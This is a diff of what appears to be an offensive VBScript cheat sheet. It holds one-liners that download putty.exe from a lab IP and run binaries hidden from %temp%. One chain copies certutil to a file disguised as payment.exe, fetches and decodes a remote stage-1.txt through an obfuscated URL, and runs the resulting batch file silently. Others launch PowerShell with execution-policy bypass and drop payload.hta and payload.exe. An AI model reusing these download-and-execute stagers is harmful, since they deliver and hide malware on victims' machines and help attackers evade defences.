@@ -1,17 +1,76 @@
 # Download and Save to %programdata%
 Set objWinHttp = CreateObject("WinHttp.WinHttpRequest.5.1"):URL = "http://10.10.10.101/putty.exe":objWinHttp.open "GET", URL, False:objWinHttp.send "":SaveBinaryData "C:\ProgramData\putty.exe",objWinHttp.responseBody:Function SaveBinaryData(FileName, Data):Const adTypeText = 1:Const adSaveCreateOverWrite = 2:Dim BinaryStream:Set BinaryStream = CreateObject("ADODB.Stream"):BinaryStream.Type = adTypeText:BinaryStream.Open:BinaryStream.Write Data:BinaryStream.SaveToFile FileName, adSaveCreateOverWrite:End Function
 
+# Download Exec in TEMP through Certutil
+Set xyz = CreateObject("Wscript.shell"):xyz.Run ("CmD /c echo Set xyz = CreateObject(""Wscript.shell""):WScript.Sleep(5000):xyz.Run (""cmd /c if not exist %temp%\payment.exe copy c:\windows\system32\certutil.exe %temp%\payment.exe""):WScript.Sleep(5000):xyz.Run (""%temp%\payment.exe -f -ur""""lc""""ache h""""t""""t""""p:/""""/10.10.10.101:8080/stage-1.txt %temp%\stage.txt""):WScript.Sleep(5000):xyz.Run (""%temp%\payment.exe -decode %temp%\stage.txt %temp%\stage.bat""):WScript.Sleep(5000):Dim objWshShl : Set objWshShl = WScript.CreateObject(""WScript.Shell"") : objWshShl.CurrentDirectory = objWshShl.ExpandEnvironmentStrings(""%temp%"") : objWshShl.Run ""stage.bat"",0 > %temp%\test.vbs & %temp%\test.vbs")
+
 # Exec File
 Set WshShell = CreateObject("WScript.Shell"):WshShell.Run chr(34) & "C:\Users\[username]\Desktop\putty.exe" & chr(34), 0:Set WsgShell = Nothing
 
-# Exec File in Temp Folder
+# Exec File from Temp Folder
 Function qq(s):qq = Chr(34) & s & Chr(34):End Function:Set fso = CreateObject("Scripting.FileSystemObject"):Set sh = CreateObject("WScript.Shell"):tempfolder = fso.GetSpecialFolder(2):path = fso.BuildPath(tempfolder, "putty.exe"):sh.Run qq(path)
 // Dim objWshShl : Set objWshShl = WScript.CreateObject("WScript.Shell"):objWshShl.CurrentDirectory = objWshShl.ExpandEnvironmentStrings("%temp%"):objWshShl.Run "putty.exe",0
 // WScript.CreateObject("WScript.Shell").Run(Chr(34)+WScript.CreateObject("Scripting.FileSystemObject").GetSpecialFolder(2)+"\putty.exe"+Chr(34))
 
-# Download Exec in TEMP through Certutil
-Set xyz = CreateObject("Wscript.shell"):xyz.Run ("CmD /c echo Set xyz = CreateObject(""Wscript.shell""):WScript.Sleep(5000):xyz.Run (""cmd /c if not exist %temp%\payment.exe copy c:\windows\system32\certutil.exe %temp%\payment.exe""):WScript.Sleep(5000):xyz.Run (""%temp%\payment.exe -f -ur""""lc""""ache h""""t""""t""""p:/""""/10.10.10.101:8080/stage-1.txt %temp%\stage.txt""):WScript.Sleep(5000):xyz.Run (""%temp%\payment.exe -decode %temp%\stage.txt %temp%\stage.bat""):WScript.Sleep(5000):Dim objWshShl : Set objWshShl = WScript.CreateObject(""WScript.Shell"") : objWshShl.CurrentDirectory = objWshShl.ExpandEnvironmentStrings(""%temp%"") : objWshShl.Run ""stage.bat"",0 > %temp%\test.vbs & %temp%\test.vbs")
+# Exec Cmd
+Set oShell = CreateObject ("WScript.Shell") : oShell.run "cmd.exe /c cd C:/ProgramData & mkdir test"
+Set objShell = WScript.CreateObject("WScript.Shell") : objShell.Run "cmd.exe /c cd C:/ProgramData & mkdir test", 0, True
+
+# Exec Powershell PS1 file
+Set objShell = CreateObject("Wscript.shell"):objShell.run("powershell -Executionpolicy Bypass -nologo -noninteractive -file .\script.ps1 -parameter Example")
+
+# Write to File
+Set objFSO=CreateObject("Scripting.FileSystemObject"):outFile="payload.hta":Set objFile = objFSO.CreateTextFile(outFile,True):objFile.Write "text 1" & vbCrLf:objFile.Write "text 2" & vbCrLf:objFile.Close
 
 # Sleep 5 Sec
 WScript.Sleep(5000)
 
+# Bonus - Move file to %TEMP% and Exec
+======================================
+Set objShell = WScript.CreateObject("WScript.Shell")
+currentFolder = objShell.CurrentDirectory
+
+Dim filesys
+Set filesys = CreateObject("Scripting.FileSystemObject")
+
+Set appShell = CreateObject("Shell.Application")
+
+'Set the destination folder to be checked/created
+
+'these commented codes would use a folder under 'Program Files'
+'Const PROGRAM_FILES = &H26&
+'Set objFolder = appShell.Namespace(PROGRAM_FILES)
+'Set objFolderItem = objFolder.Self
+'Wscript.Echo objFolderItem.Path    'testing
+'destinationFolderPath = objFolderItem.Path & "\MyApp\Install" 
+
+'using '[User Profile]\Local Settings\Temp' folder, this value can be retrieved by using
+'   filesys.GetSpecialFolder(2)     or      objShell.ExpandEnvironmentStrings("%temp%")
+'testing - Wscript.Echo filesys.GetSpecialFolder(2)   ' or objShell.ExpandEnvironmentStrings("%temp%")
+destinationFolderPath = objShell.ExpandEnvironmentStrings("%temp%") & "\MyApp.TMP" 'Folder name'
+
+'Check if folder exists
+Dim newfolder
+If Not filesys.FolderExists(destinationFolderPath) Then
+'if not then create one
+    Set newfolder = filesys.CreateFolder(destinationFolderPath)
+Else
+'clear all existing files under the destination folder
+    filesys.DeleteFile(destinationFolderPath & "\*"), true  ' true - delete read only files
+End If
+
+'Copy all files "\*.*" under current folder to the destination folder
+filesys.CopyFile currentFolder & "\payload.exe", destinationFolderPath & "\", true  ' true - overwrite existing
+
+'Run installer
+objShell.Run ("""" & destinationFolderPath & "\payload.exe" & """")
+'objShell.Run ("""" & destinationFolderPath & "\payload.exe" & """"), 0, true     ' 0 - Hides the window and activates another window.
+' true - the script should wait for the program to finish executing before continuing to the next statement
+
+'Finalise
+set appShell = Nothing
+set filesys = Nothing
+set objShell = Nothing
+Wscript.Quit 
+ 
+'Soure: http://rical.blogspot.com/2011/10/vbscript-example-to-copy-files-to-user.html
